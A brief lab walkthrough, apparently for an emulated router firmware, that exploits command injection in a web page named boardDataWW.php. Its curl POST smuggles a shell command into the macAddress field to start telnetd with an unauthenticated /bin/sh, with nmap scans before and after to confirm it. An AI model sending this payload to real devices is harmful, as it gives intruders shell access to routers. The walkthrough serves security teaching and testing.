Assuming that the emulation is running and the infered network address is 192.168.0.100, it's time to exploit the vulnerability.

1. Check the services running and note that telnet is not running:
nmap 192.168.0.100

2. From another terminal, run the following to launch the exploit:
curl -L --max-redir 0 -m 5 -s -f -X POST -d "macAddress=000000000000;telnetd -l /bin/sh;&reginfo=1&writeData=Submit" http://192.168.0.100/boardDataWW.php

3. Verify the telnet daemon was started
nmap 192.168.0.100
